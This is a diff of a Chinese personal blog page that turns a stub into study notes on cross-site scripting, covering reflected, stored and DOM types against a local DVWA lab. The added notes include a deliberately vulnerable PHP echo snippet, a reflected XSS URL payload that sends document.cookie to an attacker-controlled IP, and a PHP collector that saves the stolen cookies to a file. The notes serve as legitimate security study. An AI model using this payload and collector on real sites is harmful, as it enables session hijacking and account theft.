@@ -3,7 +3,7 @@
 <html lang="zh_CN">
 <head>
     <meta charset="utf-8" />
-    <title>XSS学习笔记~ | Tremseの部屋</title>
+    <title>XSS跨站脚本攻击 | Tremseの部屋</title>
     <meta name="author" content="Tremse" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -156,7 +156,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>XSS学习笔记~</h1>
+        <h1>XSS跨站脚本攻击</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -184,8 +184,15 @@
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #ff7d73">
-                    CTF
+                <a href="/tags/Web/" style="color: #ffa2c4">
+                    Web
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP/" style="color: #00a596">
+                    PHP
                 </a>
             </span>
             
@@ -194,7 +201,29 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="这是我的笔记！不太好参考噢"><a href="#这是我的笔记！不太好参考噢" class="headerlink" title="这是我的笔记！不太好参考噢~"></a>这是我的笔记！不太好参考噢~</h1>
+        <blockquote>
+<p>这是我的笔记！不太好参考噢~</p>
+</blockquote>
+<p>&emsp;&emsp;XSS即跨站脚本攻击(Cross Site Scripting),本来应该缩写成css，但毕竟三大件有了，就叫xss了。<font color="#ff9f9f"><strong>只有动态网站才有会被xss的可能</strong></font>，因为xss原理就是在网页中注入而已js语句，在用户访问时执行它们来达到目的，静态网站由于没有注入点(毕竟不需要交互，没有输入)是不会被攻击的。<br>&emsp;&emsp;比如某个页面后端用php编写，有以下源码:</p>
+<pre><code class="PHP">&lt;?php
+$xss = $_GET[&#39;x&#39;];
+echo $xss;
+?&gt;
+</code></pre>
+<p>&emsp;&emsp;那么很明显，我们可以通过控制x这个用户输入变量来干一些事情，插入一段js代码不在话下，这就是最简单的xss攻击了。</p>
+<h3 id="XSS攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a>XSS攻击的类型</h3><h4 id="emsp-1-反射型·非持久化XSS"><a href="#emsp-1-反射型·非持久化XSS" class="headerlink" title="&emsp;1.反射型·非持久化XSS"></a>&emsp;<font color="#5f5f5f">1.反射型·非持久化XSS</font></h4><p>&emsp;&emsp;一次性的XSS攻击，将XSS代码通过url中参数的形式发送至服务器，让其解析并返回含有XSS的结果给浏览器，使之执行XSS代码，达到攻击目的。<br>&emsp;&emsp;通过某些手段(比如rz学长非常喜欢玩的QR-code)让用户访问存在XSS的url，使得XSS攻击成功。一个应用就是拿取用户在本站的cookie。<br>&emsp;&emsp;以DVWA靶场的反射型XSS为例，如果我们如此构造一个url(注意靶场url，我是用docker部署的，8087端口映射到80)(注意script标签是不准确的，因为标准的会被识别为html标签所以这样绕过):</p>
+<pre><code class="URL">http://localhost:8087/vulnerabilities/xss_r/?name=&lt;&quot;scripts&gt;document.location=&#39;http://192.168.43.15/cookiein.php?cookie=&#39;+document.cookie;&lt;&quot;/scripts&gt;
+</code></pre>
+<p>&emsp;&emsp;并且在我们的服务器上有这么一个页面(部署在”192.168.43.15&#x2F;cookiein.php”):</p>
+<pre><code class="PHP">&lt;?php
+$cookie=$_GET[&#39;cookie&#39;];
+file_put_contents(&#39;cookie.txt&#39;,$cookie);
+?&gt;
+</code></pre>
+<p>&emsp;&emsp;那么只要某个用户通过这个url进入靶场，那么就可以得到他的cookie并且存储到cookie.txt中。</p>
+<h4 id="emsp-2-存储型·持久化XSS"><a href="#emsp-2-存储型·持久化XSS" class="headerlink" title="&emsp;2.存储型·持久化XSS"></a>&emsp;<font color="#5f5f5f">2.存储型·持久化XSS</font></h4><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，<font color="#ff9f9f"><strong>提交的代码会存储在服务器端</strong></font>（数据库、内存、文件系统等），下次有用户请求目标页面时XSS会再次运行(已经成为了页面的一部分了)，从而攻击成功。这样甚至不用诱导目标访问某个url就能达到目的。<br>&emsp;&emsp;也就是说，只要进行一次XSS攻击，XSS恶意代码就会被保留在页面中，只要有用户访问该页面，就会触发。其它的和反射型XSS是一致的。</p>
+<h4 id="emsp-3-DOM型XSS"><a href="#emsp-3-DOM型XSS" class="headerlink" title="&emsp;3.DOM型XSS"></a>&emsp;<font color="#5f5f5f">3.DOM型XSS</font></h4><p>&emsp;&emsp;当js脚本从url获得数据并将其传递到支持动态代码执行的接收器时，就会产生基于DOM的XSS漏洞。<br>&emsp;&emsp;例如，有这样的页面:<br><img src="/2024/11/07/XSS/XSS1.png" alt="js代码"><br>&emsp;&emsp;通过检查元素可以发现注入(输入)点:<br><img src="/2024/11/07/XSS/XSS2.png" alt="输入点"></p>
+
     </div>
     
     
